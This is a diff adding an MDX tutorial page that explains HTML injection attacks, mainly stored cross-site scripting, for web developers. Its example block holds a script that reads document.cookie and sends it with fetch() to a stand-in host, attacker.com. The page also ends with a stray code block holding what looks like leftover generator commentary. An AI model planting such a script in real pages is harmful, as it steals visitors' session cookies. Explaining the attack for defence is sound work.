@@ -1,0 +1,54 @@
+---
+title: HTML Injection Attacks
+description: Learn about different types of HTML injection attacks and how to detect and exploit vulnerabilities.
+---
+
+# HTML Injection Attacks
+
+HTML injection attacks are a common form of web security vulnerability where an attacker injects malicious HTML or JavaScript code into a web page. These attacks can lead to various consequences, including data theft, unauthorized access, and website defacement. In this section, we'll explore different types of HTML injection attacks, techniques for detecting and exploiting vulnerabilities, and real-world examples.
+
+## Types of HTML Injection Attacks
+
+There are several types of HTML injection attacks, including:
+
+1. **Cross-Site Scripting (XSS):** XSS attacks involve injecting malicious scripts into web pages viewed by other users. There are three main types of XSS attacks: stored XSS, reflected XSS, and DOM-based XSS.
+
+2. **Cross-Site Request Forgery (CSRF):** CSRF attacks exploit the trust that a website has in a user's browser to perform unauthorized actions on behalf of the user.
+
+3. **HTML Injection (Client-Side):** In this type of attack, the attacker injects HTML or JavaScript code into input fields or other user-controlled areas of a web page to manipulate its behavior.
+
+## Techniques for Detecting and Exploiting HTML Injection Vulnerabilities
+
+Detecting and exploiting HTML injection vulnerabilities require a thorough understanding of web application security principles and testing techniques. Some common techniques include:
+
+- **Input Validation:** Properly validating and sanitizing user input to prevent injection attacks.
+
+- **Black Box Testing:** Using tools and techniques to analyze a web application's behavior from an external perspective, looking for vulnerabilities.
+
+- **White Box Testing:** Analyzing the source code and internal workings of a web application to identify potential vulnerabilities.
+
+## Real-World Examples and Case Studies
+
+Let's look at a real-world example of an HTML injection attack:
+
+### Example
+
+Consider a web application that allows users to post comments on a forum. The application fails to properly sanitize user input, allowing attackers to inject malicious HTML code into comments.
+
+```html
+<!-- Malicious HTML code injected by attacker -->
+<script>
+  // Malicious script to steal user cookies
+  var cookies = document.cookie;
+  // Send stolen cookies to attacker-controlled server
+  fetch("https://attacker.com/steal_cookies?data=" + encodeURIComponent(cookies));
+</script>
+```
+When other users view the comments section, the injected script will execute in their browsers, stealing their cookies and sending them to the attacker's server. This demonstrates the impact of HTML injection vulnerabilities in real-world scenarios.
+
+Understanding the different types of HTML injection attacks, techniques for detection, and real-world examples is essential for web developers and security professionals to protect against these vulnerabilities effectively.
+
+```css
+
+This MDX code explains HTML injection attacks, including the types of attacks (such as XSS, CSRF, and client-side HTML injection), techniques for detecting and exploiting vulnerabilities, and real-world examples. An example of HTML injection is provided to illustrate how attackers can exploit vulnerabilities in web applications.
+```
